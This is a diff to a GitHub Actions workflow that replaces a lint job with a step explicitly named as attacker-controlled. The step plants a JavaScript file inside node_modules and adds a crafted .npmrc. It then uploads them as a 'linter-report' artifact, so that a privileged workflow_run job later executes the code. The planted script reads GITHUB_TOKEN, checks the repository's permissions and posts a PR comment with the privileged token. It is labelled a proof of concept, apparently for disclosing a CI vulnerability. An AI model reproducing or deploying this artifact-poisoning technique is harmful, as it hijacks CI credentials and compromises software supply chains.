@@ -8,42 +8,39 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v6
-        with:
-          fetch-depth: 0
-
-      - name: Check for src/pages changes
-        id: changes
-        env:
-          BASE_REF: ${{ github.base_ref }}
+      - name: Produce attacker-controlled linter-report artifact
         run: |
-          git diff --name-only "origin/${BASE_REF}...HEAD" | grep -q '^src/pages/' \
-            && echo "changed=true" >> $GITHUB_OUTPUT \
-            || echo "changed=false" >> $GITHUB_OUTPUT
-
-      - name: Lint
-        id: lint
-        if: steps.changes.outputs.changed == 'true'
-        continue-on-error: true
-        run: npx --yes github:AdobeDocs/adp-devsite-utils runLint -v
-
-      - name: Save PR number
-        if: always()
-        env:
-          PR_NUMBER: ${{ github.event.pull_request.number }}
-        run: echo "$PR_NUMBER" > pr-number.txt
-
-      - name: Upload linter report
-        if: always()
-        uses: actions/upload-artifact@v7
+          mkdir -p node_modules/adp-devsite-scripts/linter-bot
+          cat > node_modules/adp-devsite-scripts/linter-bot/postLinterReport.js <<'JS'
+          const fs = require('fs');
+          const pr = fs.readFileSync('pr-number.txt', 'utf8').trim();
+          const token = process.env.GITHUB_TOKEN;
+          console.log('[PoC] attacker-controlled JavaScript executed inside the privileged workflow_run job, uid=' + process.getuid());
+          console.log('[PoC] repo=' + process.env.GITHUB_REPOSITORY + ' pr=' + pr + ' token_length=' + String(token || '').length);
+          (async () => {
+            const h = { Authorization: 'Bearer ' + token, Accept: 'application/vnd.github+json', 'X-GitHub-Api-Version': '2022-11-28' };
+            const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY, { headers: h });
+            const j = await r.json();
+            console.log('[PoC] token-scoped GET repo status=' + r.status + ' permissions=' + JSON.stringify(j.permissions || j.message));
+            const c = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + pr + '/comments', {
+              method: 'POST', headers: { ...h, 'Content-Type': 'application/json' },
+              body: JSON.stringify({ body: 'PoC: posted by attacker-controlled code running inside the privileged `Post Linter Report` workflow_run job.' })
+            });
+            const cj = await c.json();
+            console.log('[PoC] privileged comment POST status=' + c.status + ' url=' + (cj.html_url || cj.message));
+          })();
+          JS
+          printf 'global=true\n' > .npmrc
+          echo "attacker controlled report" > linter-report.txt
+          echo "${{ github.event.pull_request.number }}" > pr-number.txt
+          ls -la . node_modules/adp-devsite-scripts/linter-bot
+      - name: Upload linter-report artifact
+        uses: actions/upload-artifact@v4
         with:
           name: linter-report
+          include-hidden-files: true
           path: |
+            .npmrc
+            node_modules/adp-devsite-scripts/linter-bot/postLinterReport.js
             linter-report.txt
             pr-number.txt
-          if-no-files-found: ignore
-
-      - name: Fail if linter found errors
-        if: steps.changes.outputs.changed == 'true' && steps.lint.outcome == 'failure'
-        run: exit 1
